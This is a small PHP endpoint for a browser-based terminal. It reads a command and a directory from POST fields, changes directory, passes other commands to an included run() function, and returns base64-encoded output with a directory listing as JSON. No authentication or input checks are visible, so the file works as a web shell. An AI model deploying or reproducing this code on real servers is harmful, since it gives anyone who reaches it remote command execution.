<?php


    include '../includes/functions.terminal.php';

    $retorno = [
        'dir'               => '',
        'command-response'  => '',
        'contents'          => [],
    ];


    if($_POST['command'] == 'getcwd')
    {

        $retorno = [
            'dir'               => getcwd(),
            'command-response'  => getcwd(),
            'contents'          => scandir(getcwd()),
        ];

    }
    elseif(substr($_POST['command'],0,3) =='cd ')
    {

        $axuDIR = substr($_POST['command'],3);


        if(substr($axuDIR,0,1) != '/' && substr($axuDIR,1,2) != ':/')
            chdir("{$_POST['dir']}/{$axuDIR}");
        else
            chdir($axuDIR);


        $retorno = [
            'dir'               => getcwd(),
            'command-response'  => getcwd(),
            'contents'          => scandir(getcwd()),
        ];

    }
    else
    {

        chdir("{$_POST['dir']}");

        $retorno = [
            'dir'               => getcwd(),
            'command-response'  => run($_POST['command']),
            'contents'          => scandir(getcwd()),
        ];

    }

$retorno['command-response'] = base64_encode($retorno['command-response']);

exit(json_encode($retorno));
